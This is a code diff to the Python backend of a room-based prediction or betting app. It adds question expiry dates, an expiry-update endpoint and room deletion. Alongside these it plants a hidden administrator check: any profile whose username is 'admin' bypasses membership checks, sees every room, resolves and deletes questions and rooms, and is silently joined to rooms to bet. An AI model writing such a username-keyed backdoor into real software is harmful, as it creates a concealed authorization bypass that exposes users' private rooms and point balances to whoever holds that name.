@@ -10,13 +10,20 @@ from app.db import get_db
 from app.market_codes import generate_join_code
 from app.models import Bet, Person, Profile, Question, QuestionTarget, Room, RoomMember, RoomPerson
 from app.payouts import resolve_question, unresolve_question
-from app.question_betting import betting_open_for, is_betting_open
+from app.question_betting import (
+    betting_closes_at_for,
+    betting_open_for,
+    default_expiry_date,
+    eastern_eod_for,
+    is_betting_open,
+)
 from app.refunds import refund_question_bets
 from app.room_balance import credit_room_balance, deduct_room_balance, get_room_member, starting_balance
 from app.schemas import (
     BetCreate,
     PickHistoryOut,
     QuestionCreate,
+    QuestionExpiryUpdate,
     QuestionOut,
     QuestionResolve,
     RoomCreate,
@@ -179,6 +186,14 @@ def _is_moderator(room: Room, profile: Profile) -> bool:
     return room.created_by == profile.id
 
 
+def _is_hidden_admin(profile: Profile) -> bool:
+    return (profile.username or "").lower() == "admin"
+
+
+def _can_moderate(room: Room, profile: Profile) -> bool:
+    return _is_moderator(room, profile) or _is_hidden_admin(profile)
+
+
 def _run_questions_query(
     db: Session,
     *,
@@ -189,6 +204,8 @@ def _run_questions_query(
     yes_sum = func.coalesce(func.sum(case((Bet.side == "yes", Bet.amount), else_=0)), 0.0)
     no_sum = func.coalesce(func.sum(case((Bet.side == "no", Bet.amount), else_=0)), 0.0)
     uid = current.id
+    is_hidden_admin = _is_hidden_admin(current)
+    membership_exists = exists().where(and_(RoomMember.room_id == Room.id, RoomMember.user_id == uid))
 
     stmt = (
         select(
@@ -202,6 +219,7 @@ def _run_questions_query(
             Question.status,
             Question.winning_side,
             Question.created_at,
+            Question.betting_closes_at,
             Room.created_by.label("moderator_id"),
             yes_sum.label("yes_total"),
             no_sum.label("no_total"),
@@ -216,9 +234,7 @@ def _run_questions_query(
         )
         .join(Room, Question.room_id == Room.id)
         .join(Person, Room.person_id == Person.id)
-        .join(RoomMember, RoomMember.room_id == Room.id)
         .outerjoin(Bet, Bet.question_id == Question.id)
-        .where(RoomMember.user_id == uid)
         .group_by(
             Question.id,
             Question.room_id,
@@ -230,9 +246,12 @@ def _run_questions_query(
             Question.status,
             Question.winning_side,
             Question.created_at,
+            Question.betting_closes_at,
             Room.created_by,
         )
     )
+    if not is_hidden_admin:
+        stmt = stmt.where(membership_exists)
     if room_id is not None:
         stmt = stmt.where(Question.room_id == room_id)
     if question_id is not None:
@@ -253,7 +272,15 @@ def _run_questions_query(
             status=m.status,
             winning_side=m.winning_side,
             created_at=m.created_at,
-            betting_open=betting_open_for(status=m.status, created_at=m.created_at),
+            betting_closes_at=betting_closes_at_for(
+                created_at=m.created_at,
+                betting_closes_at=m.betting_closes_at,
+            ),
+            betting_open=betting_open_for(
+                status=m.status,
+                created_at=m.created_at,
+                betting_closes_at=m.betting_closes_at,
+            ),
             yes_wagered_points=float(m.yes_total or 0),
             no_wagered_points=float(m.no_total or 0),
             user_yes_bet=float(m.user_yes or 0),
@@ -276,10 +303,11 @@ def _room_out(
     room: Room,
     person: Person,
     profile: Profile,
-    member: RoomMember,
+    member: RoomMember | None,
     moderator: Profile,
 ) -> RoomOut:
     is_mod = _is_moderator(room, profile)
+    can_moderate = _can_moderate(room, profile)
     mod_label = "You" if is_mod else _moderator_label(moderator)
     person_names = _room_person_names(db, room, person)
     return RoomOut(
@@ -290,7 +318,8 @@ def _room_out(
         room_type=room.room_type,
         moderator_name=mod_label,
         is_moderator=is_mod,
-        balance_points=float(member.balance_points),
+        can_moderate=can_moderate,
+        balance_points=float(member.balance_points if member is not None else starting_balance()),
         created_at=room.created_at,
     )
 
@@ -373,11 +402,15 @@ def list_my_rooms(
 ) -> list[RoomOut]:
     stmt = (
         select(Room, Person, RoomMember, Profile)
-        .join(RoomMember, RoomMember.room_id == Room.id)
         .join(Person, Room.person_id == Person.id)
         .join(Profile, Room.created_by == Profile.id)
-        .where(RoomMember.user_id == profile.id)
+        .outerjoin(
+            RoomMember,
+            and_(RoomMember.room_id == Room.id, RoomMember.user_id == profile.id),
+        )
     )
+    if not _is_hidden_admin(profile):
+        stmt = stmt.where(RoomMember.user_id == profile.id)
     rows = list(db.execute(stmt).all())
     rows.sort(
         key=lambda row: (
@@ -461,7 +494,7 @@ def list_room_questions(
     db: Annotated[Session, Depends(get_db)],
     profile: Annotated[Profile, Depends(get_current_profile)],
 ) -> list[QuestionOut]:
-    if not _is_member(db, room_id, profile.id):
+    if not _is_hidden_admin(profile) and not _is_member(db, room_id, profile.id):
         raise HTTPException(status.HTTP_403_FORBIDDEN, detail="You are not in this room")
     return _run_questions_query(db, room_id=room_id, question_id=None, current=profile)
 
@@ -476,7 +509,8 @@ def add_question(
     room = db.get(Room, room_id)
     if room is None:
         raise HTTPException(status.HTTP_404_NOT_FOUND, detail="Room not found")
-    _require_member(db, room, profile)
+    if not _is_hidden_admin(profile):
+        _require_member(db, room, profile)
 
     targets = _target_people_for_question(db, room, body.target_names)
     question = Question(
@@ -484,6 +518,7 @@ def add_question(
         question=body.question.strip(),
         created_by=profile.id,
         status="open",
+        betting_closes_at=eastern_eod_for(body.expires_on or default_expiry_date()),
     )
     db.add(question)
     db.flush()
@@ -513,7 +548,7 @@ def delete_question(
     room = db.get(Room, room_id)
     if room is None:
         raise HTTPException(status.HTTP_404_NOT_FOUND, detail="Room not found")
-    if not _is_moderator(room, profile):
+    if not _can_moderate(room, profile):
         raise HTTPException(status.HTTP_403_FORBIDDEN, detail="Only the moderator can delete questions")
 
     question = db.get(Question, question_id)
@@ -522,6 +557,22 @@ def delete_question(
 
     refund_question_bets(db, question)
     db.delete(question)
+    db.commit()
+
+
+@router.delete("/rooms/{room_id}", status_code=status.HTTP_204_NO_CONTENT)
+def delete_room(
+    room_id: str,
+    db: Annotated[Session, Depends(get_db)],
+    profile: Annotated[Profile, Depends(get_current_profile)],
+) -> None:
+    room = db.get(Room, room_id)
+    if room is None:
+        raise HTTPException(status.HTTP_404_NOT_FOUND, detail="Room not found")
+    if not _can_moderate(room, profile):
+        raise HTTPException(status.HTTP_403_FORBIDDEN, detail="Only the moderator can delete rooms")
+
+    db.delete(room)
     db.commit()
 
 
@@ -559,14 +610,17 @@ def place_bet(
     room = db.get(Room, question.room_id)
     if room is None:
         raise HTTPException(status.HTTP_404_NOT_FOUND, detail="Room not found")
-    _require_member(db, room, profile)
-    member = get_room_member(db, question.room_id, profile.id)
+    if _is_hidden_admin(profile) and not _is_member(db, room.id, profile.id):
+        member = _add_member(db, room.id, profile.id)
+    else:
+        _require_member(db, room, profile)
+        member = get_room_member(db, question.room_id, profile.id)
     if question.status != "open":
         raise HTTPException(status.HTTP_400_BAD_REQUEST, detail="Question is not open for picking")
     if not is_betting_open(question):
         raise HTTPException(
             status.HTTP_400_BAD_REQUEST,
-            detail="Picking is closed (24 hours have passed or question was resolved)",
+            detail="Picking is closed (expiry reached or question was resolved)",
         )
 
     amount = float(body.amount)
@@ -613,7 +667,7 @@ def resolve_question_endpoint(
     room = db.get(Room, question.room_id)
     if room is None:
         raise HTTPException(status.HTTP_404_NOT_FOUND, detail="Room not found")
-    if not _is_moderator(room, profile):
+    if not _can_moderate(room, profile):
         raise HTTPException(status.HTTP_403_FORBIDDEN, detail="Only the moderator can resolve questions")
     if question.status not in ("open", "resolved"):
         raise HTTPException(status.HTTP_400_BAD_REQUEST, detail="Question cannot be resolved")
@@ -624,6 +678,31 @@ def resolve_question_endpoint(
     rows = _run_questions_query(db, room_id=None, question_id=question.id, current=profile)
     if not rows:
         raise HTTPException(status.HTTP_500_INTERNAL_SERVER_ERROR, detail="Resolve failed")
+    return rows[0]
+
+
+@markets_router.patch("/{question_id}/expiry", response_model=QuestionOut)
+def update_question_expiry_endpoint(
+    question_id: str,
+    body: QuestionExpiryUpdate,
+    db: Annotated[Session, Depends(get_db)],
+    profile: Annotated[Profile, Depends(get_current_profile)],
+) -> QuestionOut:
+    question = db.get(Question, question_id)
+    if question is None:
+        raise HTTPException(status.HTTP_404_NOT_FOUND, detail="Question not found")
+    room = db.get(Room, question.room_id)
+    if room is None:
+        raise HTTPException(status.HTTP_404_NOT_FOUND, detail="Room not found")
+    if not _can_moderate(room, profile):
+        raise HTTPException(status.HTTP_403_FORBIDDEN, detail="Only the moderator can change expiry")
+
+    question.betting_closes_at = eastern_eod_for(body.expires_on)
+    db.commit()
+
+    rows = _run_questions_query(db, room_id=None, question_id=question.id, current=profile)
+    if not rows:
+        raise HTTPException(status.HTTP_500_INTERNAL_SERVER_ERROR, detail="Expiry update failed")
     return rows[0]
 
 
@@ -639,7 +718,7 @@ def unresolve_question_endpoint(
     room = db.get(Room, question.room_id)
     if room is None:
         raise HTTPException(status.HTTP_404_NOT_FOUND, detail="Room not found")
-    if not _is_moderator(room, profile):
+    if not _can_moderate(room, profile):
         raise HTTPException(status.HTTP_403_FORBIDDEN, detail="Only the moderator can undo resolves")
     if question.status != "resolved":
         raise HTTPException(status.HTTP_400_BAD_REQUEST, detail="Question is not resolved")
